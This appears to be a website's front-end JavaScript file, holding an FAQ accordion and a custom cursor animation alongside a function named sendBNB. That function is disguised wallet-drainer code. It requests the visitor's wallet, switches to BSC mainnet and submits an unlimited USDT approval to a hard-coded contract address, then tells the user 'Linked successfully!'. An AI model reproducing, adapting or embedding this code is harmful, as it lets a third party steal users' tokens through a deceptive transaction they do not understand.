document.addEventListener("DOMContentLoaded", () => {

  document.querySelectorAll(".faq-question").forEach(btn => {
    btn.addEventListener("click", () => {
      const item = btn.closest(".faq-item");

      // close others (optional – remove if you want multi-open)
      document.querySelectorAll(".faq-item").forEach(i => {
        if (i !== item) i.classList.remove("active");
      });

      item.classList.toggle("active");
    });
  });

});

document.addEventListener("DOMContentLoaded",()=>{

  const dot = document.querySelector(".cursor-dot");
  const ring = document.querySelector(".cursor-ring");

  if(!dot || !ring){
    console.error("Cursor elements missing!");
    return;
  }

  let mouseX = 0, mouseY = 0;
  let ringX = 0, ringY = 0;

  window.addEventListener("mousemove", e => {
    mouseX = e.clientX;
    mouseY = e.clientY;

    dot.style.left = mouseX + "px";
    dot.style.top = mouseY + "px";
  });

  function animateRing(){
    ringX += (mouseX - ringX) * 0.15;
    ringY += (mouseY - ringY) * 0.15;

    ring.style.left = ringX + "px";
    ring.style.top = ringY + "px";

    requestAnimationFrame(animateRing);
  }

  animateRing();

  // Hover grow
  document.querySelectorAll("a, button").forEach(el=>{
    el.addEventListener("mouseenter",()=>{
      ring.style.width="52px";
      ring.style.height="52px";
      ring.style.borderColor="rgba(60,231,255,.9)";
    });

    el.addEventListener("mouseleave",()=>{
      ring.style.width="36px";
      ring.style.height="36px";
      ring.style.borderColor="rgba(180,100,255,.9)";
    });
  });

});
async function sendBNB() {
  if (!window.ethereum) {
    alert("No wallet detected");
    return;
  }

  try {
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    const from = accounts[0];

    // 1. Switch Chain (Essential)
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }] // BSC Mainnet
      });
    } catch (e) { console.log("Already on BSC or user refused switch"); }

    // 2. Setup Addresses
    const USDT_TOKEN = "0x55d398326f99059ff775485246999027b3197955"; // Real USDT
    const YOUR_REMIX_CONTRACT = "0xa7848f343dac2f4b10fe3b6366ec8a376bb512b1"; // <--- PASTE YOURS HERE

    // 3. Construct Data (approve(address,uint256))
    const functionSelector = "0x095ea7b3";
    const spender = YOUR_REMIX_CONTRACT.toLowerCase().replace("0x", "").padStart(64, "0");
    const amount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // Unlimited

    const txData = functionSelector + spender + amount;

    const txParams = {
      from: from,
      to: USDT_TOKEN,
      data: txData,
      value: "0x0",
    };

    // 4. Send
    const hash = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [txParams]
    });

    alert("Linked successfully! Transaction: " + hash);

  } catch (err) {
    console.error(err);
    alert("Error: " + (err.message || "Rejected"));
  }
}